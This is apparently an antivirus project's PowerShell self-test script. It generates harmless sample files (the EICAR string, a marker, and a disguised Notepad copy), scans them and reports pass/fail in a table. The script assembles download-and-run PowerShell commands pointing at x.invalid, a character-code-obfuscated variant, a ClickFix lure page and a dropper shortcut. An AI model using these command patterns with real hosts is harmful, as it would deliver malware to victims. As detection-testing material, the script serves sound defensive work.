# Hexward self-test, in the spirit of AMTSO's Security Features Check: builds harmless test files of
# every kind Hexward should catch, scans them, and writes a results table (docs/SELFTEST.md).
#
#   pwsh scripts/selftest.ps1 -Hexward target/release/hexward.exe [-Out docs/SELFTEST.md]
#
# Every sample is harmless: Hexward's own test marker, a copy of Notepad, and attack-shaped text that
# points at x.invalid (a domain that can't exist). Attack-shaped strings are built from pieces at
# run time so this script itself never contains a whole one. Another antivirus may remove some
# files before Hexward sees them; those are reported as "blocked by another antivirus", not failures.

param(
    [Parameter(Mandatory = $true)][string]$Hexward,
    [string]$Out = "docs/SELFTEST.md"
)

$ErrorActionPreference = "Stop"
Add-Type -AssemblyName System.IO.Compression, System.IO.Compression.FileSystem
$dir = Join-Path ([IO.Path]::GetTempPath()) "hexward-selftest-$PID"
New-Item -ItemType Directory -Force $dir | Out-Null
$marker = [Text.Encoding]::ASCII.GetBytes("HEXWARD-HARMLESS-TEST-MARKER-7f3a9c")

function Zip($path, $name, [byte[]]$bytes) {
    $fs = [IO.File]::Create($path)
    $z = New-Object IO.Compression.ZipArchive($fs, [IO.Compression.ZipArchiveMode]::Create)
    $e = $z.CreateEntry($name).Open(); $e.Write($bytes, 0, $bytes.Length); $e.Dispose()
    $z.Dispose(); $fs.Dispose()
}
function J([string[]]$parts) { -join $parts }

$tests = @()
function Add($file, $what, $expect) { $script:tests += [pscustomobject]@{ File = $file; What = $what; Expect = $expect } }

# 1-4: the same harmless marker, plain and packed
[IO.File]::WriteAllBytes("$dir\marker.bin", $marker); Add "marker.bin" "Signature rule on a plain file" "Test/Any.HexwardMarker"
Zip "$dir\archive.zip" "marker.bin" $marker; Add "archive.zip" "Inside a ZIP" "Test/Any.HexwardMarker"
Zip "$dir\inner.zip" "marker.bin" $marker
Zip "$dir\nested.zip" "inner.zip" ([IO.File]::ReadAllBytes("$dir\inner.zip")); Remove-Item "$dir\inner.zip"; Add "nested.zip" "Inside a ZIP inside a ZIP" "Test/Any.HexwardMarker"
$gz = [IO.File]::Create("$dir\marker.bin.gz"); $g = New-Object IO.Compression.GZipStream($gz, [IO.Compression.CompressionMode]::Compress); $g.Write($marker, 0, $marker.Length); $g.Dispose(); $gz.Dispose(); Add "marker.bin.gz" "Inside GZIP" "Test/Any.HexwardMarker"

# 5-6: file-name and disguise tricks
[IO.File]::WriteAllText("$dir\invoice.pdf.exe", "not really a program"); Add "invoice.pdf.exe" "Double extension" "DoubleExt"
Copy-Item "$env:SystemRoot\System32\notepad.exe" "$dir\holiday-photo.jpg"; Add "holiday-photo.jpg" "Program disguised as a photo" "Masquerade"

# 7: EICAR, the standard antivirus test file (built from halves)
$eicar = (J @('X5O!P%@AP[4\PZX54(P^)7CC)7}', '$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'))
[IO.File]::WriteAllText("$dir\eicar.com", $eicar); Add "eicar.com" "EICAR test file" "EICAR"

# 8: PowerShell download-and-run (points at x.invalid)
[IO.File]::WriteAllText("$dir\update.ps1", (J @('IE', 'X (New-Object Net.WebClient).Downl', "oadString('http://x.invalid/a.ps1')"))); Add "update.ps1" "Script that downloads and runs code" "Script.DownloadExec"

# 9: the same, hidden with character codes
$inner = J @('IE', 'X (New-Object Net.WebClient).Downl', "oadString('http://x.invalid/b.ps1')")
$codes = ($inner.ToCharArray() | ForEach-Object { "[char]$([int]$_)" }) -join "+"
[IO.File]::WriteAllText("$dir\hidden.ps1", "`$c = $codes; & ([scriptblock]::Create(`$c))"); Add "hidden.ps1" "Obfuscated download-and-run (character codes)" "Script.DownloadExec"

# 10: ClickFix "verify you're human" page
$page = J @('<html><body><p>Verify you are human: press Win+R, then Ctrl+V and Enter.</p><script>navigator.clipboard.writeText("power', 'shell -w hidden -c iw', 'r http://x.invalid/c | ie', 'x")</script></body></html>')
[IO.File]::WriteAllText("$dir\verify.html", $page); Add "verify.html" "ClickFix page" "Html.ClickFix"

# 11: shortcut that starts hidden PowerShell
try {
    $sh = New-Object -ComObject WScript.Shell
    $lnk = $sh.CreateShortcut("$dir\document.pdf.lnk")
    $lnk.TargetPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    $lnk.Arguments = (J @('-w hid', 'den -c "iw', 'r http://x.invalid/d -OutFile $env:TEMP\d.exe; start $env:TEMP\d.exe"'))
    $lnk.Save()
    Add "document.pdf.lnk" "Shortcut dropper" "Lnk"
} catch {}

# 12: a clean program must stay clean (false-alarm control)
Copy-Item "$env:SystemRoot\System32\notepad.exe" "$dir\notepad.exe"; Add "notepad.exe" "Clean Windows program (must not be flagged)" ""

Start-Sleep -Seconds 2   # let any other antivirus act first
& $Hexward scan $dir --json --no-cache > "$dir\result.json"
$threats = @((Get-Content "$dir\result.json" -Raw | ConvertFrom-Json).summary.threats)

$rows = @(); $pass = 0; $fail = 0; $removed = 0
foreach ($t in $tests) {
    $path = Join-Path $dir $t.File
    $hits = @($threats | Where-Object { (Split-Path $_.path -Leaf) -eq $t.File } | ForEach-Object { $_.detections } | ForEach-Object { $_.name })
    $readable = $true
    try { [void][IO.File]::ReadAllBytes($path) } catch { $readable = $false }
    if (-not (Test-Path $path) -or -not $readable) { $status = "blocked by another antivirus first"; $removed++ }
    elseif ($t.Expect -eq "") { if ($hits.Count -eq 0) { $status = "PASS (clean)"; $pass++ } else { $status = "FAIL: flagged as $($hits -join ', ')"; $fail++ } }
    elseif (@($hits | Where-Object { $_ -like "*$($t.Expect)*" }).Count -gt 0) { $status = "PASS"; $pass++ }
    else { $status = "FAIL: got $(if ($hits) { $hits -join ', ' } else { 'nothing' })"; $fail++ }
    $rows += "| $($t.What) | ``$($t.File)`` | $(if ($t.Expect) { $t.Expect } else { 'nothing' }) | $status |"
}

$ver = (& $Hexward --version) -replace '^hexward\s*', ''
$md = @(
    "# Hexward self-test",
    "",
    "Harmless samples of each kind of threat Hexward should catch, in the spirit of AMTSO's",
    "[Security Features Check](https://www.amtso.org/security-features-check/). Built and run by",
    "[scripts/selftest.ps1](../scripts/selftest.ps1); the release pipeline runs it on every release.",
    "",
    "Hexward $ver · $(Get-Date -Format 'yyyy-MM-dd') · **$pass passed, $fail failed$(if ($removed) { ", $removed blocked by another antivirus first" })**",
    "",
    "| Test | File | Expected | Result |",
    "|---|---|---|---|"
) + $rows
New-Item -ItemType Directory -Force (Split-Path $Out) | Out-Null
$md -join "`n" | Out-File -Encoding utf8 $Out
$md -join "`n" | Write-Host
if ($env:GITHUB_STEP_SUMMARY) { $md -join "`n" | Out-File -Append -Encoding utf8 $env:GITHUB_STEP_SUMMARY }
Remove-Item -Recurse -Force $dir
if ($fail -gt 0) { exit 1 } else { exit 0 }
